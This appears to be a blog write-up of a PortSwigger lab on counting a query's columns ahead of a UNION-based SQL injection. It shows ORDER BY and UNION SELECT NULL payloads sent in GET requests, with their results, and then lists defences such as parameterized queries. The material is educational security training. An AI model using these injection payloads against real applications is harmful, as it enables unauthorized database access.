---
title: "SQL injection UNION attack: determining the number of columns"
date: 2026-06-09 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, sql-injection, union, order-by]
description: "A PortSwigger Web Security Academy lab on the first step of every UNION-based SQL injection — learning how many columns the original query returns, using ORDER BY and UNION SELECT NULL."
---

## Overview

This [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) lab is the first step of every UNION-based [SQL injection](https://cwe.mitre.org/data/definitions/89.html): figuring out how many columns the original query returns. A shop's category filter pastes user input straight into a SQL `WHERE` clause, so a single quote breaks out into SQL. Before you can `UNION` in data from other tables, both queries must return the same number of columns — so we count them first.

## The technique

The category filter builds a query like:

```sql
SELECT name, description, price FROM products WHERE category = '<input>' AND released = 1
```

Because the value is concatenated rather than parameterized, injecting a `'` ends the string and the rest of our input runs as SQL — classic [CWE-89](https://cwe.mitre.org/data/definitions/89.html).

SQL only allows `UNION` between two `SELECT`s that return the **same number of columns**. There are two reliable ways to discover that number:

- **`ORDER BY` climb** — sort by column position *N*, increasing *N* until the database errors. The last value that worked equals the column count.
- **`UNION SELECT NULL` padding** — add `NULL`s until the query succeeds. `NULL` casts to any column type, so it isolates *count* from *type*.

The trailing `-- -` comments out the original `AND released = 1` so it can't break our injected query.

## Solution

Counting with `ORDER BY` — climb until it errors:

```
GET /filter?category=Gifts' ORDER BY 3-- -    →  200 OK
GET /filter?category=Gifts' ORDER BY 4-- -    →  500 error  (only 3 columns)
```

Confirming with `UNION SELECT NULL` — pad until it succeeds:

```
GET /filter?category=Gifts' UNION SELECT NULL-- -            →  500
GET /filter?category=Gifts' UNION SELECT NULL,NULL-- -       →  500
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- -  →  200  (3 columns)
```

The working request that solved the lab:

```
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--+- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

Both methods agree on **3 columns**. The instant the three-NULL UNION ran cleanly, the lab status flipped to **Solved**.

## Why it worked

The application concatenates the `category` parameter directly into a SQL statement with no parameterization, so input crosses the boundary from data into code. The visible difference between a clean `200` and a `500` error leaks exactly how many columns the query returns — the attacker reads the database's reaction to incrementally probe its structure.

## Fix / defense

- **Parameterize every query** with prepared statements / bound parameters. User input then travels as data and can never break out of the string literal.
- Use an ORM or query builder that parameterizes by default.
- Apply least-privilege database accounts, and **suppress raw database errors** — the `500` vs `200` difference is precisely the oracle that hands an attacker the column count.
